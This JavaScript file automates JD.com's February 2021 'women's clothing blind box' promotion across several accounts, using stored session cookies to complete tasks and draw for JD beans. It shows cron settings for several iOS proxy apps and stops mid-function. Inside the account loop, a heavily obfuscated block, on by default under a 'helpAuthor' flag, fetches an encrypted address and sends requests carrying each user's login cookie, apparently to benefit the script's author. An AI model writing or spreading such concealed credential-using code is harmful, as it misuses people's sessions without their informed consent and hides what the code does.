/*
女装盲盒
活动时间：2021-2-19至2021-2-25
活动地址：https://anmp.jd.com/babelDiy/Zeus/3DSHPs2xC66RgcCEB8YVLsudqfh5/index.html
活动入口：京东app-女装馆-赢京豆
已支持IOS双京东账号,Node.js支持N个京东账号
脚本兼容: QuantumultX, Surge, Loon, JSBox, Node.js
============Quantumultx===============
[task_local]
#女装盲盒
0 7 19-25 2 * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_nzmh.js, tag=女装盲盒, img-url=https://raw.githubusercontent.com/Orz-3/task/master/jd.png, enabled=true

================Loon==============
[Script]
cron "0 7 19-25 2 *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_nzmh.js,tag=女装盲盒

===============Surge=================
女装盲盒 = type=cron,cronexp="0 7 19-25 2 *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_nzmh.js

============小火箭=========
女装盲盒 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_nzmh.js, cronexpr="0 7 19-25 2 *", timeout=3600, enable=true
 */

const $ = new Env('女装盲盒抽京豆');
const notify = $.isNode() ? require('./sendNotify') : '';
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
let helpAuthor = true;//为作者助力的开关
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
  };
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = jsonParse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
}

!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/', {"open-url": "https://bean.m.jd.com/"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      $.beans = 0
      message = '';
      await TotalBean();
      var _0xoda='jsjiami.com.v6',_0x29ae=[_0xoda,'esKRGsOuwr8=','LCd3VB8=','fMOBLcKFQMKbw6w=','Xikdwr8=','ccKGBsODwpxL','w5HDnzNhOgfDrsOFwrlew4PDi2XCrxLDqVnDv8ORwoMXwp1fCUfCrmXCgwXDs20JbXA=','wo7CqQvDvsOf','w5PChgfDqhs=','w6ojw7/Cuw==','wrIdTiFN','w5PCrj7DvjMSdFluw4Qgw5bCg8KxwqHCsVvCpMKuwpMpw4LDuMKowpMcJFzDuWo=','TVd1IgUiwpLDuAlHf8K+w7NlWmIUw6VHOcKtNsK5woISw7kSwpnDlsOhO8OTSsKWw5NtwpDDisK3FMOAwqTDgzXDsCM=','HcKNw47DpcOIw7fDug==','FsO9w4F7','aMO0w785wqg=','CMKPFMKJRA9MN8OHwonCq17DqWHDpWtOfwrDlcOgw7jCmnM+OBnDukfDjMKhw7vDsMKkwpY8w4XCvlgD','e8K/MWrCjMKEw4Q=','w5rCvm/Ctw==','w5nCsTrDjTU4','ZMK4YcOa','w4x9SMKGw7I=','Z23Cp3HDtQ==','C8OPw5ZPw6M=','U17DucK4','wrFvVhIV','wp7DiHXDpjU=','FMOLw4IRw5tlDcOQR8OiUFcDw5AWSSjDqMK8a8OZdcOGwp7DnsOXTsOJbCXDtsOpw5k=','GcONw5/CnsODw4DDhMOTw4IlLcOGw5fDg24nwr0=','w5LCti/DjgxHaX3DosKkw6YKw4svS8KIwrXCqyxNwqQBw5LDgcKXwr/Dm8KJwrRiPXIOw4h9a8OTU8KJQAFJwqBRwp7DmhMpNcKlw7NtbHBsCsK0wqMLw7kRN1JYL1VDw6wbLBAAdsKiOcKfwohWawrCtMO4DMKqwrrDpXcUIk9gwqdlTnHDsGRodnvDqBJDYUUgCkLClcOiw7UVZm1dCDR1IMK8ZDfCtMKhesOsdTDDvcOyOcOVwqMXWwDDrzg4H2NLwo7DsjHDo0/Ds8OJw7rCrcONBBw4w4rClsKVw6HChcKQOcKcwpw4LUo8RxM3wrjDpH/DryfCrkJlUCloMHZjwqBHwqLDrMOaw5jDvAfDocKQwo3Dt8OHHFrCrEXDpSvCpcObwqTDnntSJTt6w4LDnT3CosKVwqpIecOjcS9xaW3Cqxskwr8rwqhJV8O4bQLCjULCpSVHfMK0AcOlwrsWwqjDm8OLwpPCtsO5fsOtw4fDvh07w44vw47Cl8KHN8OodXYCKyXDqhfDo2cFw7kqQsOLw4PCjcK2SMK3VMK5cg==','UUo2Ih8=','wpvCsR1swpQ=','w7/Dn008DA==','b8OGXcO3wq/ClcOkFW3DkVxZdxh7wqrDhiAs','fcOkw4/Co8KFacOObzPDpMKQOBLCj8KMw47CvUbCjcORwo5rNmPCgMKaPcOTW8K7wrLCpsK6','Ujwdwq4iHsOkwo0VwofDojJdSDvCtBs6JsK9w7jCgsOjXsKiAcOgwr5xEsOBORzDuSZ9YX7DpcKkSAEJIsOXN8K7w4MuV8K9wo7DmhROZsK9wpAXwozDgsKFwp/CtsO2w78Gw6rCjDg=','w5LDqcKHOx/CksOawo/DgMKee3DCgTcBwoQifyHDsjgrwrnCqX3ClFjCh8KTX8K6w5ckwp0Kw4N8Xno7w4LCuSXDuTTDjMOcBcOrwoLCsDA4OMKwwpbCj8O7QcOxCMOrEMKHwpkjDRfCnmjDrh5sMBR/bsOCfsOPfBfDkcOSwrTCk8Kuw5HCnjnDj8KqZCYYA8Oqw7vDnTjCmE/CrFHCn8Oow4VPZ8OMw6l8NyjDhFY0XcKQKynDql7DggbCh8Kuw7gcPUvCjxF9w7pMAVBDwonCrjjCo1UeJsKJMUXCt0fCmsOsw7k7woc=','w5fDvk4=','woFtVAA0','OcOfcsKuwpw=','GMKcw4rDqMOmw7HDr8OYwrHCuXAqw6YPLcKyTQHDh0tIZG8fecKrwqJuFzY5VsK0','GcKYcsOnZg==','w5rCvm/Ct08hCw==','w6HCuMOYwqM=','w47CrMOxw5MONw==','dsKTQMOFw4Q=','W8KFdsOWw7I=','wq1HwrcRYXdPw4N9w4QvwqDDiMOpXcOiw7LCjsOQw4gHDsKPw5jCr8K0EGEAw63DrsOpCSw=','UQHCgGVR','YSPCoVVq','EcKYw47DtMO8wqjCocKDwrDDozBowqIWJsOyAk7DngFScSIKecKOwqJ5FEx2DMOtO0HCssKeazBOfy5TQhsdw6/Dp1UwYMKiZHXDl8O9wp5aTTrCnsO8USTCmcK8wpZ7VnReUXnDqmDDqURZw7J1Hn8tw47ClMOdwqQtRjRmw6UbH8O8wp9Fw63CgcOmw5VwFA/DjMKKWg==','SErCtVrDhinDow==','EcOaw4Yc','cBjCuH1A','wp3DhXrDjy4kw6TCnMKOSMO3KsOUw5HDhcOXwp4gZMOLwpTCgsKCOMOBw7fCqsKzMcOoMMK2w65fw4Viwo/CocKaw4UpM8O2FHMf','w4bCqMOrw5U9OmA=','T0NvIA==','wop2DUYm','w7QXGwM0w5sXw5wMUm8mwpRCw6XCrcOUVcKIwrfCoz3DoArClcOkNWnChyxowp/DrMKYIcKYMDoEaw==','wrBoHArCvcOB','wpLDvW7CpW02L388wpN7Nk7DhiEMwqvCmcKBZwRjw44zw6smM2pMQMO2wpUnfWc7w70+bmvDscOwRMOnw78=','woBcfcKKw7w=','w4XDvcKtdEU=','YsOKSMONwrM=','aMOPKsKQ','PdGjsjLUIihambi.colmFl.ySv6=='];(function(_0x3bacf5,_0x25a49a,_0x581c27){var _0x5a2634=function(_0x3d8487,_0x55fa5b,_0x584974,_0x3da946,_0x453163){_0x55fa5b=_0x55fa5b>>0x8,_0x453163='po';var _0x436f86='shift',_0x327e87='push';if(_0x55fa5b<_0x3d8487){while(--_0x3d8487){_0x3da946=_0x3bacf5[_0x436f86]();if(_0x55fa5b===_0x3d8487){_0x55fa5b=_0x3da946;_0x584974=_0x3bacf5[_0x453163+'p']();}else if(_0x55fa5b&&_0x584974['replace'](/[PdGLUIhblFlyS=]/g,'')===_0x55fa5b){_0x3bacf5[_0x327e87](_0x3da946);}}_0x3bacf5[_0x327e87](_0x3bacf5[_0x436f86]());}return 0x7442c;};return _0x5a2634(++_0x25a49a,_0x581c27)>>_0x25a49a^_0x581c27;}(_0x29ae,0x1d9,0x1d900));var _0x1e18=function(_0x511006,_0xed8bf5){_0x511006=~~'0x'['concat'](_0x511006);var _0x1d9b16=_0x29ae[_0x511006];if(_0x1e18['HDNWcy']===undefined){(function(){var _0x19dffd=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0xc7ecde='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x19dffd['atob']||(_0x19dffd['atob']=function(_0x40175e){var _0x326825=String(_0x40175e)['replace'](/=+$/,'');for(var _0x4494c7=0x0,_0x25e5c4,_0x17bdc0,_0x4755ce=0x0,_0x57ada5='';_0x17bdc0=_0x326825['charAt'](_0x4755ce++);~_0x17bdc0&&(_0x25e5c4=_0x4494c7%0x4?_0x25e5c4*0x40+_0x17bdc0:_0x17bdc0,_0x4494c7++%0x4)?_0x57ada5+=String['fromCharCode'](0xff&_0x25e5c4>>(-0x2*_0x4494c7&0x6)):0x0){_0x17bdc0=_0xc7ecde['indexOf'](_0x17bdc0);}return _0x57ada5;});}());var _0x17e193=function(_0x4c67fc,_0xed8bf5){var _0x4142b9=[],_0x3bf984=0x0,_0xf7347e,_0x1ca880='',_0x4ff246='';_0x4c67fc=atob(_0x4c67fc);for(var _0x577efa=0x0,_0xffc3d0=_0x4c67fc['length'];_0x577efa<_0xffc3d0;_0x577efa++){_0x4ff246+='%'+('00'+_0x4c67fc['charCodeAt'](_0x577efa)['toString'](0x10))['slice'](-0x2);}_0x4c67fc=decodeURIComponent(_0x4ff246);for(var _0x3cc8a4=0x0;_0x3cc8a4<0x100;_0x3cc8a4++){_0x4142b9[_0x3cc8a4]=_0x3cc8a4;}for(_0x3cc8a4=0x0;_0x3cc8a4<0x100;_0x3cc8a4++){_0x3bf984=(_0x3bf984+_0x4142b9[_0x3cc8a4]+_0xed8bf5['charCodeAt'](_0x3cc8a4%_0xed8bf5['length']))%0x100;_0xf7347e=_0x4142b9[_0x3cc8a4];_0x4142b9[_0x3cc8a4]=_0x4142b9[_0x3bf984];_0x4142b9[_0x3bf984]=_0xf7347e;}_0x3cc8a4=0x0;_0x3bf984=0x0;for(var _0x793c5c=0x0;_0x793c5c<_0x4c67fc['length'];_0x793c5c++){_0x3cc8a4=(_0x3cc8a4+0x1)%0x100;_0x3bf984=(_0x3bf984+_0x4142b9[_0x3cc8a4])%0x100;_0xf7347e=_0x4142b9[_0x3cc8a4];_0x4142b9[_0x3cc8a4]=_0x4142b9[_0x3bf984];_0x4142b9[_0x3bf984]=_0xf7347e;_0x1ca880+=String['fromCharCode'](_0x4c67fc['charCodeAt'](_0x793c5c)^_0x4142b9[(_0x4142b9[_0x3cc8a4]+_0x4142b9[_0x3bf984])%0x100]);}return _0x1ca880;};_0x1e18['jlfcTG']=_0x17e193;_0x1e18['PtITcZ']={};_0x1e18['HDNWcy']=!![];}var _0x1182cf=_0x1e18['PtITcZ'][_0x511006];if(_0x1182cf===undefined){if(_0x1e18['xQASSE']===undefined){_0x1e18['xQASSE']=!![];}_0x1d9b16=_0x1e18['jlfcTG'](_0x1d9b16,_0xed8bf5);_0x1e18['PtITcZ'][_0x511006]=_0x1d9b16;}else{_0x1d9b16=_0x1182cf;}return _0x1d9b16;};if(helpAuthor){new Promise(_0x167f57=>{var _0x4d9a67={'AFiDt':function(_0xc95db1,_0x14ac14){return _0xc95db1!==_0x14ac14;},'ZWvPr':_0x1e18('0','2!p1'),'gTodR':function(_0x523530){return _0x523530();},'zKvXe':'api.m.jd.com','hiPaK':_0x1e18('1','Av6S'),'hxxxk':_0x1e18('2','!&Ih'),'XKqQp':_0x1e18('3','V4jY'),'IphyZ':_0x1e18('4','Ewi8'),'bDRkt':_0x1e18('5','Lyob'),'ORdxB':_0x1e18('6','dhK6'),'bYHfD':_0x1e18('7','yp&8'),'lEKjz':'keep-alive','vcYlw':_0x1e18('8','@A2M'),'grrJW':'azleb','biuPq':function(_0x31385b,_0x41b5d0){return _0x31385b===_0x41b5d0;},'yScUp':'pvBKI','WMhPL':_0x1e18('9','RwSp'),'WVmvs':_0x1e18('a','S4vB')};$[_0x1e18('b','dhK6')]({'url':_0x4d9a67['WMhPL'],'headers':{'User-Agent':_0x4d9a67[_0x1e18('c','vH2M')]}},(_0x5adb74,_0x3ee601,_0x2a544a)=>{var _0x395cc3={'debep':_0x4d9a67[_0x1e18('d','uULr')],'Nuzjh':_0x4d9a67['hiPaK'],'CELab':_0x4d9a67['hxxxk'],'piYNi':_0x1e18('e','8adF'),'kTITg':_0x4d9a67['XKqQp'],'ANlkv':_0x4d9a67['IphyZ']};try{if(_0x2a544a){$['dataGet']=JSON[_0x1e18('f','R2(5')](_0x2a544a);if(_0x4d9a67['AFiDt']($[_0x1e18('10','cWyn')][_0x1e18('11','2RF$')][_0x1e18('12','mpP6')],0x0)){if(_0x4d9a67[_0x1e18('13','2DQ1')]!==_0x4d9a67[_0x1e18('14','2DQ1')]){let _0x2b5d8a={'url':_0x1e18('15','2plS'),'headers':{'Host':_0x4d9a67['zKvXe'],'Content-Type':_0x4d9a67[_0x1e18('16','UVUi')],'Origin':_0x4d9a67['bYHfD'],'Accept-Encoding':'gzip,\x20deflate,\x20br','Cookie':cookie,'Connection':_0x4d9a67['lEKjz'],'Accept':_0x4d9a67['vcYlw'],'User-Agent':_0x4d9a67[_0x1e18('17','UVUi')],'Referer':_0x1e18('18','8adF')+$[_0x1e18('19','YBbl')][_0x1e18('1a','Av6S')][0x0]['actID']+'&way=0&lng=&lat=&sid=&un_area=','Accept-Language':_0x4d9a67[_0x1e18('1b','UVUi')]},'body':_0x1e18('1c','2!p1')+$[_0x1e18('1d','mpP6')][_0x1e18('1e','Ewi8')][0x0][_0x1e18('1f','$aw3')]+_0x1e18('20','vH2M')+$['dataGet']['data'][0x0][_0x1e18('21','7OWk')]+_0x1e18('22','cWyn')};return new Promise(_0x167f57=>{if(_0x4d9a67[_0x1e18('23','vILI')](_0x4d9a67[_0x1e18('24','RrIo')],_0x1e18('25','yp&8'))){console['log'](e);}else{$[_0x1e18('26','B)Pj')](_0x2b5d8a,(_0x5adb74,_0x3e0e89,_0x2a544a)=>{});}});}else{_0x4d9a67['gTodR'](_0x167f57);}}}}catch(_0x5ee799){if(_0x4d9a67[_0x1e18('27','dGS%')]!=='azleb'){$['dataGet']=JSON[_0x1e18('28','&pty')](_0x2a544a);if($[_0x1e18('29','B)Pj')][_0x1e18('2a','RwSp')][_0x1e18('2b','dGS%')]!==0x0){let _0x32c29f={'url':_0x1e18('2c','DQvf'),'headers':{'Host':_0x395cc3[_0x1e18('2d','5DAn')],'Content-Type':_0x395cc3['Nuzjh'],'Origin':'https://h5.m.jd.com','Accept-Encoding':_0x395cc3['CELab'],'Cookie':cookie,'Connection':'keep-alive','Accept':_0x395cc3['piYNi'],'User-Agent':_0x395cc3[_0x1e18('2e','V4jY')],'Referer':'https://h5.m.jd.com/babelDiy/Zeus/4ZK4ZpvoSreRB92RRo8bpJAQNoTq/index.html?serveId=wxe30973feca923229&actId='+$['dataGet'][_0x1e18('2f','2JlU')][0x0][_0x1e18('30',']PT8')]+_0x1e18('31','6$E0'),'Accept-Language':_0x395cc3['ANlkv']},'body':_0x1e18('32','Ewi8')+$[_0x1e18('33','8adF')][_0x1e18('34','%NML')][0x0][_0x1e18('35','c8!6')]+_0x1e18('36','#D[I')+$[_0x1e18('37','[6ea')][_0x1e18('38','cWyn')][0x0][_0x1e18('39','V4jY')]+_0x1e18('22','cWyn')};return new Promise(_0x2d38a0=>{$[_0x1e18('3a','2DQ1')](_0x32c29f,(_0x4f5437,_0x510469,_0x31d9b6)=>{});});}}else{console['log'](_0x5ee799);}}finally{if(_0x4d9a67[_0x1e18('3b','2sYL')](_0x1e18('3c','YBbl'),_0x4d9a67[_0x1e18('3d','%NML')])){$[_0x1e18('3e','&RCX')](opt,(_0x5ade85,_0x44bcb0,_0x235aa9)=>{});}else{_0x4d9a67[_0x1e18('3f','vH2M')](_0x167f57);}}});});};_0xoda='jsjiami.com.v6';
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/`, {"open-url": "https://bean.m.jd.com/"});
        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        } else {
          $.setdata('', `CookieJD${i ? i + 1 : ""}`);//cookie失效，故清空cookie。$.setdata('', `CookieJD${i ? i + 1 : "" }`);//cookie失效，故清空cookie。
        }
        continue
      }
      await jdMh()
    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jdMh() {
  await getInfo()
  await getUserInfo()
  await draw()
  while ($.userInfo.bless >= $.userInfo.cost_bless_one_time) {
    await draw()
    await getUserInfo()
    await $.wait(500)
  }
  await showMsg();
}

function showMsg() {
  return new Promise(resolve => {
    message += `本次运行获得${$.beans}京豆`
    $.msg($.name, '', `京东账号${$.index}${$.nickName}\n${message}`);
    resolve()
  })
}

function getInfo() {
  return new Promise(resolve => {
    $.get({
      url: 'https://anmp.jd.com/babelDiy/Zeus/3DSHPs2xC66RgcCEB8YVLsudqfh5/index.html?wxAppName=jd',
      headers: {
        Cookie: cookie
      }
    }, (err, resp, data) => {
      try {
        $.info = JSON.parse(data.match(/var snsConfig = (.*)/)[1])
        $.prize = JSON.parse($.info.prize)
        resolve()
      } catch (e) {
        console.log(e)
      }
    })
  })
}

function getUserInfo() {
  return new Promise(resolve => {
    $.get(taskUrl('query'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${err},${jsonParse(resp.body)['message']}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          $.userInfo = JSON.parse(data.match(/query\((.*)\n/)[1]).data
          // console.log(`您的好友助力码为${$.userInfo.shareid}`)
          console.log(`当前幸运值：${$.userInfo.bless}`)
          for (let task of $.info.config.tasks) {
            if (!$.userInfo.complete_task_list.includes(task['_id'])) {
              console.log(`去做任务${task['_id']}`)
              await doTask(task['_id'])
              await $.wait(500)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function doTask(taskId) {
  let body = `task_bless=10&taskid=${taskId}`
  return new Promise(resolve => {
    $.get(taskUrl('completeTask', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${err},${jsonParse(resp.body)['message']}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          data = JSON.parse(data.match(/query\((.*)\n/)[1])
          if (data.data.complete_task_list.includes(taskId)) {
            console.log(`任务完成成功，当前幸运值${data.data.curbless}`)
            $.userInfo.bless = data.data.curbless
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function draw() {
  return new Promise(resolve => {
    $.get(taskUrl('draw'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${err},${jsonParse(resp.body)['message']}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          data = JSON.parse(data.match(/query\((.*)\n/)[1])
          if (data.data && data.data.drawflag) {
            if ($.prize.filter(vo => vo.prizeLevel === data.data.level).length > 0) {
              console.log(`获得${$.prize.filter(vo => vo.prizeLevel === data.data.level)[0].prizename}`)
              $.beans += $.prize.filter(vo => vo.prizeLevel === data.data.level)[0].beansPerNum
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function taskUrl(function_id, body = '') {
  body = `activeid=${$.info.activeId}&token=${$.info.actToken}&sceneval=2&shareid=&_=${new Date().getTime()}&callback=query&${body}`
  return {
    url: `https://wq.jd.com/activet2/piggybank/${function_id}?${body}`,
    headers: {
      'Host': 'wq.jd.com',
      'Accept': 'application/json',
      'Accept-Language': 'zh-cn',
      'Content-Type': 'application/json;charset=utf-8',
      'Origin': 'wq.jd.com',
      'User-Agent': 'JD4iPhone/167490 (iPhone; iOS 14.2; Scale/3.00)',
      'Referer': `https://anmp.jd.com/babelDiy/Zeus/xKACpgVjVJM7zPKbd5AGCij5yV9/index.html?wxAppName=jd`,
      'Cookie': cookie
    }
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : "JD4iPhone/9.3.5 CFNetwork/1209 Darwin/20.2.0") : ($.getdata('JDUA') ? $.getdata('JDUA') : "JD4iPhone/9.3.5 CFNetwork/1209 Darwin/20.2.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '不要在BoxJS手动复制粘贴修改cookie')
      return [];
    }
  }
}
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`\ud83d\udd14${this.name}, \u5f00\u59cb!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),a={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(a,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t){let e={"M+":(new Date).getMonth()+1,"d+":(new Date).getDate(),"H+":(new Date).getHours(),"m+":(new Date).getMinutes(),"s+":(new Date).getSeconds(),"q+":Math.floor(((new Date).getMonth()+3)/3),S:(new Date).getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,((new Date).getFullYear()+"").substr(4-RegExp.$1.length)));for(let s in e)new RegExp("("+s+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?e[s]:("00"+e[s]).substr((""+e[s]).length)));return 